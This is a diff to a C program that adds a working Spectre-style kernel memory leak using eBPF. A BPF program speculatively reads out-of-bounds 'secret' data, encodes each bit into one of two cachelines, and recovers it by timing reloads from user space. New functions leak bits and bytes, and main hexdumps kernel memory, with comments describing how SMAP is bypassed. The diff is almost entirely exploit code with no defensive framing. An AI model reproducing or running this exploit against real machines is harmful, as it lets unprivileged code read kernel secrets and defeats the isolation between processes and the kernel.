@@ -5,6 +5,7 @@
 #include <stdlib.h> // calloc
 #include <string.h> // memset
 #include <pthread.h>
+#include <ctype.h> // isalnum
 #include "bpfheader.h"
 
 #define ALLOC_SIZE 		1024*1024*512 // 512 MB
@@ -213,6 +214,17 @@ static unsigned long get_leak_index_from_bruteforce(int prog_map)
 	return 0;
 }
 
+void bounce_two_cachelines(int fd1, int fd2) {
+  cacheline_bounce_fds[0] = fd1;
+  cacheline_bounce_fds[1] = fd2;
+  __sync_synchronize();
+  cacheline_bounce_status = 1;
+  __sync_synchronize();
+  while (cacheline_bounce_status != 0) __sync_synchronize();
+  __sync_synchronize();
+}
+
+
 struct mem_leaker_prog load_mem_leaker_prog() {
   struct mem_leaker_prog ret;
 
@@ -236,6 +248,99 @@ struct mem_leaker_prog load_mem_leaker_prog() {
   array_set(ret.prog_map, 0, quitter_prog);
 
   ret.kernel_leak_area_index = get_leak_index_from_bruteforce(ret.prog_map);
+	if(ret.kernel_leak_area_index ==0)
+		err(1, "kernel leak fail");
+
+  ret.victim_map = array_create(8, 5/*whatever*/);
+
+  // control runtime behavior with this.
+  // slot 0: index of secret value
+  // slot 1: start offset in prog_map
+  // slot 2: bitmask (1/2/4/8/...)
+  // slot 3: bitshift selector (0/1/2/3/...)
+  ret.data_map = array_create(8, 4);
+
+  struct bpf_insn insns[] = {
+    // save context for tail call
+    BPF_MOV64_REG(BPF_REG_6, BPF_REG_ARG1),
+
+    // r7 = bitmask
+    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
+    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
+    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 2),
+    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
+    BPF_GOTO_EXIT_IF_R0_NULL,
+    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
+
+    // r9 = bitshift selector
+    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
+    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
+    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 3),
+    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
+    BPF_GOTO_EXIT_IF_R0_NULL,
+    BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 0),
+
+    // r8 = prog_array_base_offset = *map_lookup_elem(data_map, &1)
+    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
+    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
+    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 1),
+    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
+    BPF_GOTO_EXIT_IF_R0_NULL,
+    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),
+
+    // r0 = secret_data_offset = *map_lookup_elem(data_map, &0)
+    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
+    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
+    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
+    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
+    BPF_GOTO_EXIT_IF_R0_NULL,
+    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0),
+
+    // r2 = &secret_data_offset
+    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
+    BPF_STX_MEM(BPF_W, BPF_REG_ARG2, BPF_REG_0, 0),
+
+    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.victim_map),
+    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), /* speculative execution starts in here */
+    BPF_GOTO_EXIT_IF_R0_NULL, /* predicted: non-NULL, actual: NULL */
+    BPF_LDX_MEM(BPF_DW, BPF_REG_ARG3, BPF_REG_0, 0),
+	//BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),  /* leak test - fp */
+
+    /*
+     * mask and shift secret value so that it maps to one of two cachelines.
+     */
+    BPF_ALU64_REG(BPF_AND, BPF_REG_ARG3, BPF_REG_7),
+    BPF_ALU64_REG(BPF_RSH, BPF_REG_ARG3, BPF_REG_9),
+    BPF_ALU64_IMM(BPF_LSH, BPF_REG_ARG3, 7),
+    BPF_ALU64_REG(BPF_ADD, BPF_REG_ARG3, BPF_REG_8),
+
+    BPF_LD_MAP_FD(BPF_REG_ARG2, ret.prog_map),
+    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_6),
+
+    BPF_EMIT_CALL(BPF_FUNC_tail_call),
+
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN()
+  };
+
+  int exit_idx = ARRSIZE(insns) - 1;
+  for (int i=0; i<ARRSIZE(insns); i++) {
+    if (insns[i].code == (BPF_JMP | BPF_OP(BPF_JEQ) | BPF_K) && insns[i].off == 0x7ff) {
+      printf("fixing up exit jump\n");
+      insns[i].off = exit_idx - i - 1;
+    }
+  }
+
+  printf("before leak program load\n");
+  ret.sockfd = create_filtered_socket_fd(insns, ARRSIZE(insns));
+  printf("after leak program load\n");
+
+  return ret;
 }
 
 void querypmap(pid_t pid, unsigned long vaddr, long psize, size_t pnum){
@@ -300,6 +405,108 @@ void test(){
 	querypmap(getpid(), (unsigned long) user_area, psize, ALLOC_SIZE/psize);
 }
 
+
+int leak_bit(struct mem_leaker_prog *leakprog, unsigned long dw_offset,
+        unsigned long in_dw_bit_offset,
+		unsigned long kernel_leak_area_index, char *user_leak_area) {
+  array_set_dw(leakprog->data_map, 2, 1UL<<in_dw_bit_offset); // 2 - bitmask
+  array_set_dw(leakprog->data_map, 3, in_dw_bit_offset);  // 3 - bitshift
+
+  char *user_leak_ptr1 = user_leak_area;
+  char *user_leak_ptr2 = user_leak_area + 1024; /* 64 * 8 = 1024,  8 cache lines,  Leak a bit!! */
+
+  for (int i=0; i<0x201; i++) {
+    if ((i & 0xf) != 0xf) {
+      array_set_dw(leakprog->data_map, 0, 3); // access at 8*3,  0 - index of secret value
+      array_set_dw(leakprog->data_map, 1, 0); // execute instaquit program, 1 - start offset in prog_map
+    } else {
+      array_set_dw(leakprog->data_map, 0, dw_offset); // access at 8*dw_offset
+	  array_set_dw(leakprog->data_map, 1, kernel_leak_area_index); // leak to kernel-direct-mmaped space, to bypass SMAP */
+
+      bounce_two_cachelines(leakprog->victim_map, leakprog->prog_map);
+      user_flush_cacheline(user_leak_ptr1);
+      user_flush_cacheline(user_leak_ptr2);
+    }
+
+    trigger_proc(leakprog->sockfd);
+
+    if ((i & 0xf) != 0xf) {
+
+    } else {
+      int times[2];
+      times[0] = user_timed_reload(user_leak_ptr1);
+      times[1] = user_timed_reload(user_leak_ptr2);
+      bool bit_is_0 = (times[0] < 120);
+      bool bit_is_1 = (times[1] < 120);
+      if (bit_is_0 != bit_is_1) {
+        return bit_is_1;
+      } else {
+        
+      }
+    }
+  }
+
+  return -1;
+}
+
+
+int leak_byte(struct mem_leaker_prog *leakprog, unsigned long byte_offset,
+		unsigned long kernel_leak_area_index,  char *user_leak_area) {
+  int byte = 0;
+  int bit_pos_for_byte = (byte_offset&0x7)*8;
+  for (int pos = 0; pos < 8; pos++) {
+    int bit = leak_bit(leakprog, byte_offset/8, bit_pos_for_byte + pos,
+            kernel_leak_area_index, user_leak_area);
+    if (bit == -1) {
+      return -1;
+    }
+    if (bit == 1) {
+      byte |= (1<<pos);
+    }
+  }
+  return byte;
+}
+
+
+void hexdump_memory(struct mem_leaker_prog *leakprog,
+	unsigned long kernel_leak_area_index,  char *user_leak_area,
+	unsigned long byte_offset_start, unsigned long byte_count) {
+  if (byte_count % 16)
+    errx(1, "hexdump_memory called with non-full line");
+  for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
+          byte_offset += 16) {
+    int bytes[16];
+    for (int i=0; i<16; i++) {
+      bytes[i] = leak_byte(leakprog, byte_offset + i, kernel_leak_area_index, user_leak_area);
+    }
+    char line[1000];
+    char *linep = line;
+    linep += sprintf(linep, "%08lx  ", byte_offset);
+    for (int i=0; i<16; i++) {
+      if (bytes[i] == -1) {
+        linep += sprintf(linep, "?? ");
+      } else {
+        linep += sprintf(linep, "%02hhx ", (unsigned char)bytes[i]);
+      }
+    }
+    linep += sprintf(linep, " |");
+    for (int i=0; i<16; i++) {
+      if (bytes[i] == -1) {
+        *(linep++) = '?';
+      } else {
+        if (isalnum(bytes[i]) || ispunct(bytes[i]) || bytes[i] == ' ') {
+          *(linep++) = bytes[i];
+        } else {
+          *(linep++) = '.';
+        }
+      }
+    }
+    linep += sprintf(linep, "|");
+    puts(line);
+  }
+
+}
+
 int main(int argc, char* argv[]){
   setbuf(stdout, NULL);
 	// test();
@@ -312,5 +519,10 @@ int main(int argc, char* argv[]){
     err(1, "sched_setaffinity");
 
   struct mem_leaker_prog leakprog = load_mem_leaker_prog();
+  unsigned long kernel_leak_area_index = leakprog.kernel_leak_area_index;
+
+	cacheline_bounce_worker_enable();
+	hexdump_memory(&leakprog, kernel_leak_area_index, user_leak_area_smap, 0x1000, 0x100000000);
+  return 0;
 
 }
